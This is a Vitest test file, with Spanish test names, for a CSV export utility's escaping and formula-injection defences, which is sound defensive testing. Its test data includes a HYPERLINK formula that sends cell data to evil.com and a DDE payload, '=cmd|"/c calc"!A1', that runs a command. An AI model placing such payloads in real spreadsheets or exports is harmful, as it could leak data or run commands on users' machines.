import { describe, test, expect, vi, beforeEach } from 'vitest'
import { csvField, exportCSV } from '@/pages/solicitudes/solicitudes.utils'
import type { SolicitudData } from '@/hooks/useSolicitudes'

describe('csvField', () => {
  test('envuelve valores normales entre comillas', () => {
    expect(csvField('Certificación territorial')).toBe('"Certificación territorial"')
  })

  test('escapa comillas internas duplicándolas', () => {
    expect(csvField('Dijo "hola"')).toBe('"Dijo ""hola"""')
  })

  test('reemplaza saltos de línea por espacios', () => {
    expect(csvField('línea 1\nlínea 2')).toBe('"línea 1 línea 2"')
  })

  test('null/undefined se convierten en cadena vacía', () => {
    expect(csvField(null)).toBe('""')
    expect(csvField(undefined)).toBe('""')
  })

  test.each(['=', '+', '-', '@', '\t'])(
    'neutraliza inyección de fórmulas cuando el valor empieza con "%s"',
    (prefix) => {
      const malicious = `${prefix}HYPERLINK("http://evil.com?"&A1,"click")`
      const result = csvField(malicious)
      // Debe empezar con comilla simple DENTRO de las comillas del CSV para que
      // Excel/Sheets lo trate como texto literal, no como fórmula.
      expect(result.startsWith(`"'${prefix}`)).toBe(true)
    },
  )

  test('un valor que no empieza con un disparador de fórmula no se modifica', () => {
    expect(csvField('Solicitud normal')).toBe('"Solicitud normal"')
  })
})

describe('exportCSV', () => {
  beforeEach(() => {
    URL.createObjectURL = vi.fn(() => 'blob:mock')
    URL.revokeObjectURL = vi.fn()
  })

  test('el subtipo con una fórmula maliciosa llega neutralizado al CSV generado', () => {
    let blobContent = ''
    const originalBlob = globalThis.Blob
    // @ts-expect-error - stub mínimo para inspeccionar el contenido del Blob
    globalThis.Blob = class {
      constructor(parts: string[]) { blobContent = parts.join('') }
    }

    const rows = [{
      id: '1', tipo: 'Certificación', subtipo: '=cmd|"/c calc"!A1',
      fecha: '01/01/2025', estado: 'Pendiente',
    }] as unknown as SolicitudData[]

    exportCSV(rows)
    globalThis.Blob = originalBlob

    expect(blobContent).toContain('"\'=cmd|""/c calc""!A1"')
  })
})
